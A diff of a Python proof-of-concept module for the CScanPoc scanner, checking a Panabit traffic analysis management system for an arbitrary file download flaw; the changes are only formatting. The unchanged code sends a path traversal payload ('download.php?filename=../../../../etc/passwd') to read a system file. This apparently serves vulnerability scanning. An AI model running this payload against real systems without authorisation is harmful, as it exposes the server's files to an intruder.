@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'Panabit_0001'  # 平台漏洞编号，留空
     name = '派网软件某流量分析管理系统 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_TRAVERSAL # 漏洞类型
+    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
     disclosure_date = '2015-08-27'  # 漏洞公布时间
     desc = '''
         派网软件（Panabit）某流量分析管理系统任意文件遍历:http://foorbar/download.php?filename=../../../../etc/passwd
@@ -18,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '派网软件'  # 漏洞应用名称
     product_version = '派网软件某流量分析管理系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '19eadb6e-7173-4c7f-8540-7a05af629c46'
@@ -32,11 +35,11 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2010-0136721
-            ##refer: http://wooyun.org/bugs/wooyun-2010-0114137
+            # refer: http://www.wooyun.org/bugs/wooyun-2010-0136721
+            # refer: http://wooyun.org/bugs/wooyun-2010-0114137
             hh = hackhttp.hackhttp()
             arg = self.target
-            #任意文件遍历
+            # 任意文件遍历
             payload = arg + '/download.php?filename=../../../../etc/passwd'
             code, head, res, err, _ = hh.http(payload)
 
@@ -50,6 +53,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
